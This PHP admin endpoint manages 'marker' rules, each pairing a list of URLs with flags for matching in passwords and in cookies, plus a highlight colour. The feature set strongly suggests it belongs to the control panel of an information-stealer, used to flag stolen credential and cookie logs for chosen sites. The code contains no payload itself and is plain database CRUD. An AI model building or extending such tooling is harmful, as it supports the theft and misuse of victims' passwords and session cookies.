<?php

include_once "../../config.php";
include_once "../app/functions.php";
include_once "../app/managers/AccountManager.php";

session_start();
header('Content-Type: application/json; charset=utf-8');

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

if(!$is_admin)
{
    echo json_encode(['error' => 'do not have permission to use this method']);
    exit();
}

$method                 = isset($_POST["method"]) ? $_POST["method"] : null;

$page                   = isset($_POST["page"]) ? $_POST["page"] : 1;
$draw                   = isset($_POST['draw']) ? intval($_POST['draw']) : 0;
$start                  = isset($_POST['start']) ? intval($_POST['start']) : 0;
$length                 = isset($_POST['length']) ? intval($_POST['length']) : 10;

$rule_id                = isset($_POST['rule_id']) ? intval($_POST['rule_id']) : 0;
$rule_active            = isset($_POST["rule_active"]) ? $_POST["rule_active"] : null;

$rule_name              = isset($_POST["rule_name"]) ? $_POST["rule_name"] : null;
$rule_urls              = base64_decode($_POST["rule_urls"]);
$rule_in_passwords      = isset($_POST['rule_in_passwords']) ? intval($_POST['rule_in_passwords']) : 0;
$rule_in_cookies        = isset($_POST['rule_in_cookies']) ? intval($_POST['rule_in_cookies']) : 0;
$rule_color             = isset($_POST["rule_color"]) ? $_POST["rule_color"] : null;

if($method != null)
{
    switch($method)
    {
        case "get_rules":
            getRules($page, $draw, $start, $length);
            break;

        case "change_status":
            ChangeStatus($rule_id, $rule_active);
            break;

        case "create_rule":
            CreateRule($rule_name, $rule_urls, $rule_in_passwords, $rule_in_cookies, $rule_color);
            break;

        case "delete_rule":
            DeleteRule($rule_id);
            break;

        default:
            echo json_encode(['error' => 'Unknown method']);
            exit(0);
            break;
    }
}

function getRules($page, $draw, $start, $length) 
{
    $link = ConnectDB();
    
    $conditions = [];
    
    $whereClause = '';
    if (!empty($conditions)) {
        $whereClause = ' WHERE ' . implode(' AND ', $conditions);
    }
    
    $countQuery = "SELECT COUNT(*) AS total FROM `markers`" . $whereClause;
    $countResult = $link->query($countQuery);
    $totalRecords = 0;
    if ($countResult) {
        $row = $countResult->fetch_assoc();
        $totalRecords = (int)$row['total'];
    }
    
    $limitStart = $start;
    $limitCount = (int)$length;
    
    $query = "SELECT * FROM `markers`" . $whereClause . " ORDER BY `rule_id` DESC LIMIT {$limitStart}, {$limitCount}";
    $result = $link->query($query);
    
    $data = [];
    while ($row = $result->fetch_assoc()) 
    {
        $data[] = [
            'rule_id'               => $row['rule_id'],
            'active'                => $row['active'],
            'name'                  => $row['name'],
            'urls'                  => $row['urls'],
            'in_passwords'          => $row['in_passwords'],
            'in_cookies'            => $row['in_cookies'],
            'color'                 => $row['color']
        ];
    }
    
    $total_pages = ($limitCount > 0) ? ceil($totalRecords / $limitCount) : 0;
    
    $response = [
        "draw"            => $draw,
        "recordsTotal"    => $totalRecords,
        "recordsFiltered" => $totalRecords,
        "current_page"    => $page,
        "total_pages"     => $total_pages,
        "data"            => $data
    ];
    
    echo json_encode($response);
    exit();
}

function ChangeStatus($rule_id, $rule_active)
{
    $link = ConnectDB();
    
    if (empty($rule_id) || !isset($rule_active)) 
    {
        echo json_encode(['error' => 'No rule_id or rule_active provided']);
        exit();
    }
    
    $stmt = $link->prepare("UPDATE markers SET active = ? WHERE rule_id = ?");
    
    if (!$stmt) 
    {
        echo json_encode(['error' => 'Error preparing UPDATE statement: ' . $link->error]);
        exit();
    }
    
    $stmt->bind_param("ii", $rule_active, $rule_id);
    
    // Выполнение запроса
    if (!$stmt->execute()) 
    {
        echo json_encode(['error' => 'Error executing UPDATE: ' . $stmt->error]);
        exit();
    }
    
    if ($stmt->affected_rows === 0) 
    {
        echo json_encode(['error' => 'No rule found with provided ID']);
        exit();
    }
    
    $stmt->close();
    
    echo json_encode(['success' => 'Marker rule status updated']);
    exit();
}

function CreateRule($rule_name, $rule_urls, $rule_in_passwords, $rule_in_cookies, $rule_color)
{
    $link = ConnectDB();

    $stmt = $link->prepare("INSERT INTO `markers`(`name`, `urls`, `in_passwords`, `in_cookies`, `color`, `active`) VALUES (?, ?, ?, ?, ?, '1')");
    
    if (!$stmt) 
    {
        $stmt->close();
        echo json_encode(['error' => 'Error preparing SELECT: ' . $link->error]);
        exit();
    }
    
    $stmt->bind_param("ssiis", $rule_name, $rule_urls, $rule_in_passwords, $rule_in_cookies, $rule_color);
    
    if ($stmt->execute()) 
    {
        echo json_encode(['success' => 'Marker rule created']);
        $stmt->close();
        exit();
    } 
    else
    {
        echo json_encode(['error' => 'Error adding marker rule']);
        $stmt->close();
        exit();
    }
    $stmt->close();
}

function DeleteRule($rule_id)
{
    $link = ConnectDB();
    
    if (empty($rule_id)) 
    {
        echo json_encode(['error' => 'No rule ID provided']);
        exit();
    }
    
    $stmt = $link->prepare("DELETE FROM markers WHERE rule_id = ?");

    if (!$stmt) 
    {
        echo json_encode(['error' => 'Error preparing DELETE statement: ' . $link->error]);
        exit();
    }
    
    $stmt->bind_param("i", $rule_id);

    if (!$stmt->execute()) 
    {
        echo json_encode(['error' => 'Error executing DELETE: ' . $stmt->error]);
        exit();
    }
    
    if ($stmt->affected_rows === 0) 
    {
        echo json_encode(['error' => 'No rule found with provided ID']);
        exit();
    }
    
    $stmt->close();
    
    echo json_encode(['success' => 'Marker rule deleted']);
    exit();
}

?>